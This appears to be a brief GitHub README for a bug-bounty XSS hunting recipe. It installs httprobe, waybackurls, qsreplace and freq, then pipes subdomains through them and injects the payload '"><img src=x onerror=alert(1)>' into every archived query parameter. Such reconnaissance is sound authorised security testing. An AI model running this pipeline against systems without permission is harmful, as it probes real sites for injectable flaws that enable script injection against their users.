# Find-XSS-Auto
## How To Install
1. Install _httprobe_

```go get -u github.com/tomnomnom/httprobe```

2. Install _waybackurls_

```go get github.com/tomnomnom/waybackurls```

3. Install _qsreplace_

```go get -u github.com/tomnomnom/qsreplace```

4. Install _freq_

```go get -u https://github.com/takshal/freq```

## How to Find XSS 
```
cat subdomains.txt | httprobe | tee -a host.txt
cat host.txt | waybackurls | tee -a endpoint.txt
cat endpoint.txt | qsreplace '"><img src=x onerror=alert(1)>' | tee -a xss_fuzz.txt
cat xss_fuzz.txt | freq | tee -a possible_xss.txt
```

## REF 
https://infosecwriteups.com/how-i-was-able-to-find-50-cross-site-scripting-xss-security-vulnerabilities-on-bugcrowd-public-ba33db2b0ab1
